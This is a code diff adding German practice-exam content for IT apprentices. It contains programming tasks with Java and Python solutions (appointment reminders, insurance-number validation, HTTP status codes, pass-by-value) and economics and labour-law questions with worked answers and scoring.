+        a: [['codes', [['java', `public int erinnere(List<Termin> termine, LocalDate tag) {
+    int gesendet = 0;
+    for (Termin t : termine) {
+        if (!t.getStatus().equals("gebucht")) continue;
+        if (!t.getBeginn().toLocalDate().equals(tag)) continue;
+        Patient p = t.getPatient();
+        Benachrichtigung kanal = kanaele.get(p.getKanal());
+        if (kanal == null) continue;                    // Kanal nicht verfügbar
+        String text = "Erinnerung: Ihr Termin am " + tag
+                    + " um " + t.getBeginn().toLocalTime();
+        if (kanal.senden(p, text)) gesendet++;
+    }
+    return gesendet;
+}`], ['python', `def erinnere(self, termine, tag):
+    gesendet = 0
+    for t in termine:
+        if t.get_status() != "gebucht" or t.get_beginn().date() != tag:
+            continue
+        p = t.get_patient()
+        kanal = self.kanaele.get(p.get_kanal())
+        if kanal is None:
+            continue
+        text = f"Erinnerung: Ihr Termin am {tag} um {t.get_beginn().time()}"
+        if kanal.senden(p, text):
+            gesendet += 1
+    return gesendet`]]],
+          'Vorteil des Interfaces: Der Dienst kennt nur **Benachrichtigung**; ein neuer Kanal (zum Beispiel Push) wird als neue Klasse ergänzt und in die Map eingetragen, ohne erinnere zu ändern (**Polymorphie**, Offen-geschlossen-Prinzip). Für Tests kann eine Attrappe (Mock) eingesetzt werden.', 'Bewertung: Schleife und Filter Status/Datum (2 P), Kanal aus der Map mit null-Prüfung (2 P), Text (1 P), Aufruf über das Interface und Zählen nur bei Erfolg (2 P).'],
+        see: ['eua-interface', 'eua-oop']},
+      {pts: 6, rows: 10, topic: 'Validierung', q: 'Die Krankenversichertennummer besteht aus **10 Zeichen**: einem **Großbuchstaben A bis Z** und **9 Ziffern** (Beispiel: A123456789). Schreiben Sie die Funktion **pruefeKvnr(nr)**, die true oder false zurückgibt. Verwenden Sie **keine** regulären Ausdrücke. Geben Sie zusätzlich einen regulären Ausdruck an, der dasselbe prüft.',
+        a: [['codes', [['java', `static boolean pruefeKvnr(String nr) {
+    if (nr == null || nr.length() != 10) return false;
+    char erstes = nr.charAt(0);
+    if (erstes < 'A' || erstes > 'Z') return false;
+    for (int i = 1; i < 10; i++) {
+        char c = nr.charAt(i);
+        if (c < '0' || c > '9') return false;
+    }
+    return true;
+}`], ['python', `def pruefe_kvnr(nr):
+    if nr is None or len(nr) != 10:
+        return False
+    if not ("A" <= nr[0] <= "Z"):
+        return False
+    for c in nr[1:]:
+        if not ("0" <= c <= "9"):
+            return False
+    return True`], ['pseudo', `funktion pruefeKvnr(nr)
+    wenn nr = null oder länge(nr) ≠ 10 dann rückgabe falsch
+    wenn nr[0] < 'A' oder nr[0] > 'Z' dann rückgabe falsch
+    für i = 1 bis 9
+        wenn nr[i] < '0' oder nr[i] > '9' dann rückgabe falsch
+    ende für
+    rückgabe wahr
+ende funktion`]]], ['code', 'text', 'Regulärer Ausdruck:  ^[A-Z][0-9]{9}$'],
+          'Testfälle: A123456789 (wahr), a123456789 (falsch, Kleinbuchstabe), A12345678 (falsch, 9 Zeichen), A12345678X (falsch), leerer String / null (falsch). Die echte KVNR enthält zusätzlich eine **Prüfziffer**.', 'Bewertung: Längen- und null-Prüfung (2 P), Buchstabe (1 P), Ziffernschleife (2 P), Regex (1 P).'],
+        see: ['eua-pruefziffer', 'eua-datentypen']},
+      {pts: 4, topic: 'HTTP-Statuscodes', q: 'Ordnen Sie den Situationen der TerminPlus-API den passenden HTTP-Statuscode zu.',
+        match: {keys: ['200 OK', '201 Created', '204 No Content', '401 Unauthorized', '403 Forbidden', '404 Not Found', '409 Conflict'], items: [
+          ['Ein Termin wurde erfolgreich neu angelegt.', 1], ['Der gewünschte Slot wurde inzwischen von jemand anderem gebucht.', 6], ['Die Anfrage enthält kein gültiges Anmelde-Token.', 3],
+          ['Eine angemeldete Patientin versucht, den Termin einer anderen Person abzurufen.', 4], ['Ein Termin wurde erfolgreich gelöscht, die Antwort hat keinen Inhalt.', 2],
+        ]},
+        a: ['**2xx Erfolg**, **4xx Fehler des Clients**, 5xx Fehler des Servers. 401 = nicht (gültig) angemeldet, **403 = angemeldet, aber nicht berechtigt**. 409 = Konflikt mit dem aktuellen Zustand der Ressource.'],
+        see: ['eua-webapi']},
+      {pts: 4, rows: 5, topic: 'Wert- und Referenzübergabe', q: 'Welche Ausgabe erzeugt das Java-Programm? Begründen Sie kurz.',
+        ctx: [['code', 'java', `class Termin { int beginn; Termin(int b) { beginn = b; } }
+
+static void verschiebe(Termin t, int minuten) {
+    t.beginn = t.beginn + minuten;
+    minuten = 0;
+}
+static void erhoehe(int x) { x = x + 10; }
+
+public static void main(String[] args) {
+    Termin t = new Termin(480);
+    int m = 15;
+    verschiebe(t, m);
+    erhoehe(m);
+    System.out.println(t.beginn + " " + m);
+    Termin u = t;
+    u.beginn = 600;
+    System.out.println(t.beginn);
+}`]],
+        a: [['out', `495 15
+600`], 'Java übergibt **immer Werte**. Bei int wird der Wert kopiert: Änderungen an minuten bzw. x wirken nicht auf m (bleibt 15). Bei Objekten wird die **Referenz kopiert**: t im Aufrufer und in verschiebe zeigen auf **dasselbe Objekt**, deshalb wird beginn 495. u = t kopiert ebenfalls nur die Referenz; u.beginn = 600 ändert das gemeinsame Objekt.'],
+        sol: [['diagram', {w: 640, h: 170, cap: 'Zwei Variablen, ein Objekt: t und u verweisen auf denselben Speicherbereich', nodes: [
+          {id: 't', k: 'box', x: 80, y: 50, w: 80, h: 40, t: 't'}, {id: 'u', k: 'box', x: 80, y: 120, w: 80, h: 40, t: 'u'},
+          {id: 'o', k: 'box', x: 380, y: 85, w: 200, h: 60, t: ['Termin-Objekt', 'beginn = 600'], s: 'accent'}, {id: 'm', k: 'box', x: 570, y: 85, w: 80, h: 40, t: 'm = 15', s: 'soft'},
+        ], edges: [{a: 't', b: 'o'}, {a: 'u', b: 'o'}]}]],
+        see: ['eua-funktionen', 'eua-datentypen']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/wiso4-1.js
+// Probeprüfung 4, Wirtschafts- und Sozialkunde: gebundene Aufgaben (Situation Elbcode IT-Solutions GmbH).
+(function () {
+  const ID = 'exam4-wiso';
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 4 (Gesundheit)', t: 'Wirtschafts- und Sozialkunde (gebundene Aufgaben)', blocks: []});
+  AP2.exam.start(ID, {minutes: 60, cover: AP2.exam.COVER.wiso,
+    hint: 'Schwerpunkte: Pflichten in der Ausbildung, Arbeitszeit, Kündigung und Arbeitsgericht, Sozialversicherung mit Nettoberechnung, Rechtsformen, Marktformen, Volkswirtschaft und Steuern.',
+    intro: [['p', 'Sie werden bei der **Elbcode IT-Solutions GmbH** in Hamburg (85 Beschäftigte, Betriebsrat, nicht tarifgebunden) zum Fachinformatiker für Anwendungsentwicklung ausgebildet. Die Elbcode IT-Solutions GmbH ist eine Tochter der Nordlicht Digital AG.']]});
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 1: Ausbildung und Arbeitsrecht (36 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'Pflichten Ausbildender', q: 'Welche Pflicht hat der Ausbildende nach dem Berufsbildungsgesetz?',
+        mc: {o: ['Er darf Auszubildenden auch Hilfsarbeiten ohne Bezug zum Beruf übertragen, wenn Personal fehlt.', 'Er muss Auszubildende für den Berufsschulunterricht und für Prüfungen freistellen.', 'Er kann verlangen, dass Auszubildende ihre Fachbücher selbst bezahlen.', 'Er muss Auszubildenden nach der Prüfung einen unbefristeten Arbeitsvertrag anbieten.'], c: [1]},
+        a: ['§ 14 und § 15 BBiG: Der Ausbildende muss **freistellen** (Berufsschule, Prüfungen, außerbetriebliche Maßnahmen), **Ausbildungsmittel kostenlos** stellen, nur Aufgaben übertragen, die dem **Ausbildungszweck** dienen, und ein Zeugnis ausstellen. Eine Übernahmepflicht gibt es gesetzlich nicht (teilweise tariflich).'], see: ['wiso-bbig']},
+      {pts: 4, topic: 'Pflichten im Ausbildungsverhältnis', q: 'Ordnen Sie zu, wessen Pflicht es ist.',
+        match: {keys: ['Pflicht des Auszubildenden', 'Pflicht des Ausbildenden'], items: [['Ausbildungsnachweis (Berichtsheft) führen', 0], ['Ausbildungsmittel kostenlos zur Verfügung stellen', 1], ['Am Berufsschulunterricht teilnehmen', 0], ['Ein Zeugnis bei Beendigung ausstellen', 1], ['Weisungen im Rahmen der Ausbildung befolgen', 0], ['Eine angemessene Vergütung zahlen', 1]]},
+        a: ['Auszubildende (§ 13 BBiG): **Lernpflicht**, Weisungen befolgen, Berufsschule und Prüfungen besuchen, Ausbildungsnachweis führen, Betriebsordnung und Schweigepflicht beachten. Ausbildende (§§ 14 bis 19): Ausbildungspflicht, Freistellung, Ausbildungsmittel, Vergütung, Zeugnis, Ausbildungsnachweis **kontrollieren**.'], see: ['wiso-bbig']},
+      {pts: 3, topic: 'Nicht bestanden', q: 'Ein Auszubildender besteht die Abschlussprüfung im Januar nicht. Der Ausbildungsvertrag endet am 31. Januar. Was gilt?',
+        mc: {o: ['Das Ausbildungsverhältnis endet am 31. Januar, eine Wiederholung ist nur extern möglich.', 'Auf sein Verlangen verlängert sich das Ausbildungsverhältnis bis zur nächsten Wiederholungsprüfung, höchstens um ein Jahr.', 'Der Betrieb entscheidet, ob er den Vertrag verlängert.', 'Das Ausbildungsverhältnis verlängert sich automatisch um ein volles Jahr.'], c: [1]},
+        a: ['§ 21 Abs. 3 BBiG: Besteht der Auszubildende die Prüfung nicht, **verlängert sich das Ausbildungsverhältnis auf sein Verlangen** bis zur nächstmöglichen Wiederholungsprüfung, **höchstens um ein Jahr**. Die Abschlussprüfung kann **zweimal wiederholt** werden.'], see: ['wiso-bbig']},
+      {pts: 3, topic: 'Arbeitszeit', q: 'Was regelt das Arbeitszeitgesetz zur **täglichen Höchstarbeitszeit** von Erwachsenen?',
+        mc: {o: ['Höchstens 8 Stunden, ohne Ausnahme', 'Höchstens 8 Stunden; bis zu 10 Stunden, wenn innerhalb von 6 Kalendermonaten bzw. 24 Wochen im Durchschnitt 8 Stunden werktäglich nicht überschritten werden', 'Höchstens 12 Stunden, wenn der Betriebsrat zustimmt', 'Höchstens 48 Stunden pro Woche, die Verteilung auf die Tage ist frei'], c: [1]},
+        a: ['§ 3 ArbZG: werktäglich **8 Stunden**, Verlängerung auf **10 Stunden** möglich, wenn der **Durchschnitt von 8 Stunden** in 6 Kalendermonaten oder 24 Wochen eingehalten wird. Werktage sind Montag bis Samstag (48 Stunden pro Woche). Abweichungen nur durch Tarifvertrag bzw. auf seiner Grundlage.'], see: ['wiso-arbeitsvertrag']},
+      {pts: 3, topic: 'Ruhepausen', q: 'Eine Entwicklerin arbeitet an einem Tag **9,5 Stunden**. Wie viele Minuten Ruhepause stehen ihr mindestens zu?',
+        num: {c: 45, tol: 0, unit: 'Minuten'},
+        a: ['§ 4 ArbZG: mehr als **6 bis 9 Stunden: 30 Minuten**, mehr als **9 Stunden: 45 Minuten**. Pausen können in Abschnitte von mindestens **15 Minuten** aufgeteilt werden; länger als 6 Stunden hintereinander ohne Pause ist unzulässig.'], see: ['wiso-arbeitsvertrag']},
+      {pts: 3, topic: 'Abmahnung', q: 'Ein Kollege kommt wiederholt unentschuldigt zu spät. Welche Aussage zur **Abmahnung** ist richtig?',
+        mc: {o: ['Eine Abmahnung ist nur mit Zustimmung des Betriebsrats wirksam.', 'Sie rügt ein konkretes Fehlverhalten und droht für den Wiederholungsfall arbeitsrechtliche Konsequenzen an; sie ist in der Regel Voraussetzung für eine verhaltensbedingte Kündigung.', 'Nach drei Abmahnungen ist eine fristlose Kündigung automatisch wirksam.', 'Eine Abmahnung muss notariell beurkundet werden.'], c: [1]},
+        a: ['Die Abmahnung hat **Hinweis- (Rüge-) und Warnfunktion**: konkretes Fehlverhalten benennen, Änderung verlangen, Kündigung für den Wiederholungsfall androhen. Vor einer **verhaltensbedingten** Kündigung ist sie grundsätzlich erforderlich (Verhältnismäßigkeit). Schriftform ist aus Beweisgründen üblich, aber nicht vorgeschrieben.'], see: ['wiso-kuendigung']},
+      {pts: 3, topic: 'Fristlose Kündigung', q: 'Der Arbeitgeber erfährt, dass ein Mitarbeiter Kundendaten verkauft hat. Bis wann muss er die **außerordentliche (fristlose) Kündigung** spätestens aussprechen?',
+        mc: {o: ['Innerhalb von 3 Tagen nach der Tat', 'Innerhalb von 2 Wochen, nachdem er von den maßgeblichen Tatsachen Kenntnis erlangt hat', 'Innerhalb von 3 Wochen nach Zugang einer Abmahnung', 'Eine Frist gibt es nicht'], c: [1]},
+        a: ['§ 626 Abs. 2 BGB: Die außerordentliche Kündigung muss **innerhalb von 2 Wochen ab Kenntnis** der Tatsachen erklärt werden. Voraussetzung ist ein **wichtiger Grund**, der die Fortsetzung bis zum Ablauf der Kündigungsfrist unzumutbar macht. Der Betriebsrat ist vorher anzuhören.'], see: ['wiso-kuendigung']},
+      {pts: 3, topic: 'Kündigungsschutzgesetz', q: 'Unter welchen Voraussetzungen gilt das Kündigungsschutzgesetz für einen Arbeitnehmer?',
+        mc: {o: ['Ab dem ersten Arbeitstag in jedem Betrieb', 'Wenn das Arbeitsverhältnis länger als 6 Monate besteht und im Betrieb regelmäßig mehr als 10 Arbeitnehmer beschäftigt sind', 'Nur für tarifgebundene Arbeitnehmer', 'Nur in Betrieben mit Betriebsrat'], c: [1]},
+        a: ['§ 1 und § 23 KSchG: Wartezeit **mehr als 6 Monate** und Betrieb mit **mehr als 10 Arbeitnehmern** (Teilzeitkräfte anteilig). Dann muss eine ordentliche Kündigung **sozial gerechtfertigt** sein (personen-, verhaltens- oder betriebsbedingt). Kündigungsschutzklage innerhalb von **3 Wochen** nach Zugang.'], see: ['wiso-kuendigung']},
+      {pts: 4, topic: 'Arbeitsgericht', q: 'Bringen Sie den Weg einer Kündigungsschutzklage durch die Instanzen in die richtige Reihenfolge.',
+        order: [['Kammertermin vor dem Arbeitsgericht (mit Berufsrichter und zwei ehrenamtlichen Richtern)', 2], ['Revision beim Bundesarbeitsgericht in Erfurt', 4], ['Güteverhandlung vor dem Vorsitzenden des Arbeitsgerichts', 1], ['Berufung beim Landesarbeitsgericht', 3]],
+        a: ['Erste Instanz **Arbeitsgericht**: zuerst die **Güteverhandlung** (Einigungsversuch), dann der **Kammertermin**. Zweite Instanz **Landesarbeitsgericht** (Berufung), dritte Instanz **Bundesarbeitsgericht** (Revision, nur Rechtsfragen). Vor dem Arbeitsgericht trägt in der ersten Instanz jede Seite ihre Anwaltskosten selbst.'], see: ['wiso-kuendigung']},
+      {pts: 3, topic: 'Anhörung Betriebsrat', q: 'Elbcode kündigt einer Mitarbeiterin, ohne den Betriebsrat vorher anzuhören. Welche Folge hat das?',
+        mc: {o: ['Keine, der Betriebsrat muss nur nachträglich informiert werden.', 'Die Kündigung ist unwirksam.', 'Die Kündigung wird erst nach 3 Monaten wirksam.', 'Der Betriebsrat kann eine Geldbuße verlangen, die Kündigung bleibt wirksam.'], c: [1]},
+        a: ['§ 102 Abs. 1 BetrVG: Der Betriebsrat ist **vor jeder Kündigung** anzuhören; eine **ohne Anhörung** ausgesprochene Kündigung ist **unwirksam**. Der Betriebsrat kann widersprechen (Frist eine Woche bei ordentlicher, drei Tage bei außerordentlicher Kündigung), verhindern kann er sie aber nicht.'], see: ['wiso-betriebsrat', 'wiso-kuendigung']},
+      {pts: 4, topic: 'Arbeitszeugnis', q: 'Was muss ein **qualifiziertes** Arbeitszeugnis enthalten? Kreuzen Sie **zwei** Antworten an.',
+        mc: {o: ['Art und Dauer der Tätigkeit', 'Beurteilung von Leistung und Verhalten', 'Anzahl der Krankheitstage', 'Mitgliedschaft im Betriebsrat', 'Höhe des letzten Gehalts'], c: [0, 1]},
+        a: ['§ 109 GewO: Das **einfache** Zeugnis enthält Art und Dauer der Tätigkeit, das **qualifizierte** zusätzlich **Leistung und Verhalten**. Es muss **wahr und wohlwollend** sein; Krankheit, Betriebsratstätigkeit oder Gehalt gehören nicht hinein. Auszubildende haben Anspruch auf ein Zeugnis nach § 16 BBiG.'], see: ['wiso-arbeitsvertrag']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 2: Soziale Sicherung und Entgelt (24 Punkte)',
+    tasks: [
+      {pts: 4, topic: 'Träger der Sozialversicherung', q: 'Ordnen Sie den Versicherungszweigen ihren Träger zu.',
+        match: {keys: ['Krankenkassen (zum Beispiel AOK, TK)', 'Pflegekassen bei den Krankenkassen', 'Deutsche Rentenversicherung', 'Bundesagentur für Arbeit', 'Berufsgenossenschaften'], items: [['Krankenversicherung', 0], ['Pflegeversicherung', 1], ['Rentenversicherung', 2], ['Arbeitslosenversicherung', 3], ['Unfallversicherung', 4]]},
+        a: ['Fünf Zweige, fünf Trägergruppen. Die Beiträge (außer UV) zieht die **Krankenkasse** als Einzugsstelle ein und verteilt sie. Die Unfallversicherung finanziert allein der Arbeitgeber.'], see: ['wiso-sv']},
+      {pts: 3, topic: 'Arbeitslosengeld', q: 'Welche Voraussetzung gehört zum Anspruch auf **Arbeitslosengeld I**?',
+        mc: {o: ['Mindestens 5 Jahre Beitragszahlung', 'Innerhalb der letzten 30 Monate mindestens 12 Monate versicherungspflichtig beschäftigt (Anwartschaftszeit)', 'Bedürftigkeit, das heißt kein eigenes Vermögen', 'Ein Alter von mindestens 25 Jahren'], c: [1]},
+        a: ['Voraussetzungen: **arbeitslos**, bei der Agentur für Arbeit **arbeitslos gemeldet**, **Anwartschaftszeit** erfüllt (12 Monate in 30 Monaten), der Vermittlung zur Verfügung stehen. ALG I ist eine **Versicherungsleistung** ohne Bedürftigkeitsprüfung (anders als das Bürgergeld). Spätestens 3 Monate vor Ende des Arbeitsverhältnisses arbeitsuchend melden.'], see: ['wiso-alv']},
+      {pts: 3, topic: 'Höhe ALG I', q: 'Das pauschalierte Netto-Arbeitsentgelt (Leistungsentgelt) einer kinderlosen Kollegin beträgt **2.100 Euro** im Monat. Wie hoch ist ihr Arbeitslosengeld I im Monat?',
+        num: {c: 1260, tol: 0.5, unit: 'Euro'},
+        a: ['ALG I beträgt **60 %** des Leistungsentgelts, mit mindestens einem Kind **67 %**. 2.100 Euro x 0,60 = **1.260 Euro**.'], see: ['wiso-alv']},
+      {pts: 3, topic: 'Rentenversicherung', q: 'Warum gerät die gesetzliche Rentenversicherung durch den **demografischen Wandel** unter Druck?',
+        mc: {o: ['Weil die Renten aus einem Kapitalstock bezahlt werden, der an der Börse an Wert verliert', 'Weil im Umlageverfahren immer weniger Beitragszahler immer mehr Rentenempfänger finanzieren müssen', 'Weil Beamte seit 2025 Beiträge zahlen müssen', 'Weil die Arbeitgeber keine Beiträge mehr zahlen'], c: [1]},
+        a: ['Die gesetzliche Rente arbeitet im **Umlageverfahren** (Generationenvertrag): Die heutigen Beiträge zahlen die heutigen Renten. Durch steigende Lebenserwartung und niedrige Geburtenraten sinkt das Verhältnis von Beitragszahlern zu Rentnern. Folgen: höhere Beiträge, niedrigeres Rentenniveau, höheres Rentenalter oder mehr Bundeszuschuss; private und betriebliche Vorsorge wird wichtiger.'], see: ['wiso-rv', 'wiso-demografie']},
+      {pts: 3, topic: 'Pflegeversicherung', q: 'Wer trägt den **Beitragszuschlag für Kinderlose** in der Pflegeversicherung?',
+        mc: {o: ['Arbeitgeber und Arbeitnehmer je zur Hälfte', 'Der Arbeitgeber allein', 'Der kinderlose Arbeitnehmer ab 23 Jahren allein', 'Der Staat aus Steuermitteln'], c: [2]},
+        a: ['Kinderlose Versicherte ab **23 Jahren** zahlen einen Zuschlag von **0,6 Prozentpunkten allein**. Eltern mit mehreren Kindern unter 25 erhalten Abschläge. Der Grundbeitrag (3,6 %) wird je zur Hälfte geteilt (Ausnahme Sachsen).'], see: ['wiso-pv']},
+      {pts: 4, topic: 'Nettoentgelt', q: 'Berechnen Sie das **Nettoentgelt** eines kinderlosen, 27-jährigen Entwicklers (keine Kirchensteuer) aus den Angaben der Abrechnung.',
+        ctx: [['table', ['Position', 'Wert'], [['Bruttoentgelt', '3.200,00 Euro'], ['Lohnsteuer (laut Tabelle, Steuerklasse I)', '341,08 Euro'], ['Solidaritätszuschlag', '0,00 Euro (unter der Freigrenze)'], ['Arbeitnehmeranteil Sozialversicherung gesamt', '21,75 % des Bruttoentgelts']]]],
+        num: {c: 2162.92, tol: 0.01, unit: 'Euro'},
+        a: ['Sozialversicherung: 3.200,00 x 21,75 % = **696,00 Euro**.', 'Netto = 3.200,00 - 341,08 - 0,00 - 696,00 = **2.162,92 Euro**.', 'Schema: **Brutto - Lohnsteuer - Solidaritätszuschlag - Kirchensteuer - Sozialversicherungsbeiträge (AN) = Netto**. Vermögenswirksame Leistungen oder Vorschüsse würden danach noch abgezogen (Auszahlungsbetrag).'], see: ['wiso-gehalt', 'wiso-steuern']},
+      {pts: 4, topic: 'Unfallversicherung', q: 'Welche Fälle sind **Versicherungsfälle der gesetzlichen Unfallversicherung**? Kreuzen Sie **zwei** Antworten an.',
+        mc: {o: ['Eine Kollegin stürzt im Büro über ein Netzwerkkabel.', 'Ein Kollege verletzt sich beim Fußball am Wochenende.', 'Bei einer Systemadministratorin wird eine durch Lärm im Rechenzentrum verursachte Schwerhörigkeit als Berufskrankheit anerkannt.', 'Ein Auszubildender bekommt eine Erkältung.', 'Ein Kollege verunglückt auf einem privaten Umweg zum Einkaufen nach Feierabend.'], c: [0, 2]},
+        a: ['Versicherungsfälle: **Arbeitsunfall** (einschließlich Wegeunfall auf dem direkten Weg) und **Berufskrankheit**. Freizeitunfälle und Umwege aus privaten Gründen sind nicht versichert; normale Krankheiten deckt die Krankenversicherung.'], see: ['wiso-uv']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 3: Unternehmen und Wirtschaft (40 Punkte)',
+    tasks: [
+      {pts: 4, topic: 'Organe der AG', q: 'Die Muttergesellschaft ist die Nordlicht Digital **AG**. Ordnen Sie die Aufgaben dem zuständigen Organ zu.',
+        match: {keys: ['Vorstand', 'Aufsichtsrat', 'Hauptversammlung'], items: [['Leitet die Gesellschaft in eigener Verantwortung und vertritt sie nach außen', 0], ['Bestellt und überwacht den Vorstand', 1], ['Beschließt über die Verwendung des Bilanzgewinns', 2], ['Wählt die Vertreter der Anteilseigner in den Aufsichtsrat', 2]]},
+        a: ['**Vorstand** = Geschäftsführung und Vertretung, **Aufsichtsrat** = Kontrolle, Bestellung und Abberufung des Vorstands (ab 500 Beschäftigten zu einem Drittel, ab 2.000 zur Hälfte mit Arbeitnehmervertretern), **Hauptversammlung** = Versammlung der Aktionäre: Gewinnverwendung, Wahl der Anteilseignervertreter, Satzungsänderungen, Entlastung.'], see: ['wiso-unternehmen']},
+      {pts: 3, topic: 'KG', q: 'Welche Aussage zur **Kommanditgesellschaft (KG)** ist richtig?',
+        mc: {o: ['Alle Gesellschafter haften beschränkt auf ihre Einlage.', 'Mindestens ein Komplementär haftet unbeschränkt; die Kommanditisten haften nur bis zur Höhe ihrer Einlage.', 'Die Kommanditisten führen die Geschäfte, die Komplementäre kontrollieren.', 'Die KG ist eine Kapitalgesellschaft mit 25.000 Euro Mindestkapital.'], c: [1]},
+        a: ['KG = **Personengesellschaft**. **Komplementär** (Vollhafter): unbeschränkte, unmittelbare, solidarische Haftung, Geschäftsführung und Vertretung. **Kommanditist** (Teilhafter): Haftung bis zur Einlage, keine Geschäftsführung, Kontroll- und Widerspruchsrecht bei außergewöhnlichen Geschäften. Bei der GmbH & Co. KG ist eine GmbH Komplementär.'], see: ['wiso-unternehmen']},
+      {pts: 3, topic: 'Kaufmann', q: 'Wann ist jemand nach dem Handelsgesetzbuch **Istkaufmann**?',
+        mc: {o: ['Erst mit der Eintragung ins Handelsregister', 'Wenn er ein Gewerbe betreibt, das nach Art und Umfang einen kaufmännisch eingerichteten Geschäftsbetrieb erfordert', 'Wenn er eine kaufmännische Ausbildung abgeschlossen hat', 'Wenn er mindestens 5 Angestellte hat'], c: [1]},
+        a: ['§ 1 HGB: **Istkaufmann** ist, wer ein **Handelsgewerbe** betreibt, also ein Gewerbe, das einen kaufmännischen Geschäftsbetrieb erfordert. Die Eintragung ins Handelsregister ist dann Pflicht, wirkt aber nur **deklaratorisch** (bestätigend). Kleingewerbetreibende können sich freiwillig eintragen (Kannkaufmann, konstitutiv); Kapitalgesellschaften sind Formkaufleute.'], see: ['wiso-unternehmen']},
+      {pts: 4, topic: 'Marktformen', q: 'Ordnen Sie die Märkte der passenden Marktform zu.',
+        match: {keys: ['Polypol', 'Angebotsoligopol', 'Angebotsmonopol', 'Nachfragemonopol'], items: [['Mobilfunknetze in Deutschland (wenige Netzbetreiber, Millionen Kunden)', 1], ['Obst auf einem großen Wochenmarkt', 0], ['Trinkwasserversorgung durch die örtlichen Stadtwerke', 2], ['Ein einziger Auftraggeber kauft Spezialsoftware für Kampfjets', 3]]},
+        a: ['Einteilung nach der **Zahl der Marktteilnehmer**: viele Anbieter und viele Nachfrager = **Polypol** (nahe der vollständigen Konkurrenz), wenige Anbieter = **Oligopol** (Preise werden aufeinander abgestimmt beobachtet), ein Anbieter = **Monopol** (Preissetzung), ein Nachfrager = **Nachfragemonopol (Monopson)**.'], see: ['wiso-markt']},
+      {pts: 3, topic: 'Reales Wachstum', q: 'Das nominale Bruttoinlandsprodukt stieg um **5,0 %**, die Preise (BIP-Deflator) um **2,0 %**. Um wie viel Prozent ist das BIP **real** näherungsweise gewachsen?',
+        num: {c: 3, tol: 0.07, unit: '%'},
+        a: ['Näherung: reales Wachstum ≈ nominales Wachstum - Preissteigerung = 5,0 % - 2,0 % = **3,0 %**. Genau: (1,05 / 1,02 - 1) x 100 ≈ 2,94 % (beides wird akzeptiert). Das **reale** BIP misst die Mengenentwicklung, das **nominale** enthält Preiseffekte.'], see: ['wiso-konjunktur', 'wiso-kreislauf']},
+      {pts: 3, topic: 'Arbeitslosenquote', q: 'In einer Region gibt es **43,0 Millionen Erwerbstätige** und **2,6 Millionen Arbeitslose**. Berechnen Sie die Arbeitslosenquote in Prozent (zwei Nachkommastellen).',
+        num: {c: 5.70, tol: 0.005, unit: '%'},
+        a: ['**Erwerbspersonen** = Erwerbstätige + Arbeitslose = 45,6 Millionen. **Arbeitslosenquote** = Arbeitslose / Erwerbspersonen x 100 = 2,6 / 45,6 x 100 = **5,70 %**. Häufiger Fehler: durch die Erwerbstätigen teilen (6,05 %).'], see: ['wiso-konjunktur']},
+      {pts: 3, topic: 'Wirtschaftskreislauf', q: 'Welcher Strom fließt im einfachen Wirtschaftskreislauf von den **Unternehmen** zu den **privaten Haushalten**?',
+        mc: {o: ['Faktorleistungen (zum Beispiel Arbeit)', 'Konsumausgaben', 'Einkommen (Löhne, Gehälter, Zinsen, Gewinne) sowie Güter und Dienstleistungen', 'Steuern und Sozialabgaben'], c: [2]},
+        a: ['Geldströme: Unternehmen zahlen den Haushalten **Einkommen** für ihre **Faktorleistungen** (Arbeit, Kapital, Boden); Haushalte geben es als **Konsumausgaben** für **Güter** aus. Güterströme fließen entgegengesetzt: Faktorleistungen zu den Unternehmen, Güter und Dienstleistungen zu den Haushalten. Im erweiterten Kreislauf kommen Staat, Banken (Sparen, Investieren) und Ausland hinzu.'], see: ['wiso-kreislauf']},
+      {pts: 4, topic: 'Steuerarten', q: 'Ordnen Sie die Steuern zu.',
+        match: {keys: ['direkte Steuer', 'indirekte Steuer'], items: [['Lohnsteuer', 0], ['Umsatzsteuer', 1], ['Energiesteuer (Mineralölsteuer)', 1], ['Körperschaftsteuer', 0], ['Tabaksteuer', 1], ['Gewerbesteuer', 0]]},
+        a: ['**Direkte Steuern**: Steuerschuldner und Steuerträger sind identisch (Einkommen-/Lohnsteuer, Körperschaftsteuer, Gewerbesteuer). **Indirekte Steuern**: werden über den Preis auf den Verbraucher **überwälzt** (Umsatzsteuer, Verbrauchsteuern wie Energie-, Tabak-, Stromsteuer).'], see: ['wiso-steuern']},
+      {pts: 3, topic: 'Soziale Marktwirtschaft', q: 'Welche Aussage beschreibt die **Soziale Marktwirtschaft** in Deutschland?',
+        mc: {o: ['Der Staat legt Preise und Produktionsmengen in einem zentralen Plan fest.', 'Preise bilden sich frei am Markt; der Staat sichert den Wettbewerb und sorgt für sozialen Ausgleich.', 'Der Staat greift nie in die Wirtschaft ein (Nachtwächterstaat).', 'Alle Produktionsmittel gehören dem Staat.'], c: [1]},
+        a: ['Grundsätze: **freie Preisbildung**, Privateigentum, Vertrags- und Gewerbefreiheit, **Wettbewerbsschutz** (Kartellrecht), **soziale Sicherung** und Umverteilung (Sozialversicherung, progressive Steuer, Mindestlohn), Tarifautonomie. Zentralverwaltungswirtschaft = Plan, freie Marktwirtschaft = Nachtwächterstaat.'], see: ['wiso-wirtschaftsordnung']},
+      {pts: 3, topic: 'Wettbewerbsrecht', q: 'Drei große IT-Dienstleister im Raum Hamburg vereinbaren, ihre Stundensätze nicht unter 120 Euro zu senken. Wie ist das zu beurteilen?',
+        mc: {o: ['Zulässig, weil es sich um Dienstleistungen handelt', 'Unzulässiges Preiskartell nach dem Gesetz gegen Wettbewerbsbeschränkungen; das Bundeskartellamt kann Bußgelder verhängen', 'Zulässig, wenn die IHK zustimmt', 'Zulässig, wenn die Unternehmen zum selben Konzern gehören wollen'], c: [1]},
+        a: ['§ 1 GWB verbietet **Vereinbarungen zwischen Wettbewerbern**, die den Wettbewerb beschränken, insbesondere **Preis-, Gebiets- und Mengenabsprachen**. Zuständig ist das **Bundeskartellamt** (bei EU-weiter Wirkung die EU-Kommission); es drohen hohe Bußgelder und Schadensersatz.'], see: ['wiso-kooperation', 'wiso-markt']},
+      {pts: 4, topic: 'Green IT', q: 'Welche Maßnahmen senken den **Energieverbrauch** der IT von Elbcode wirksam? Kreuzen Sie **zwei** Antworten an.',
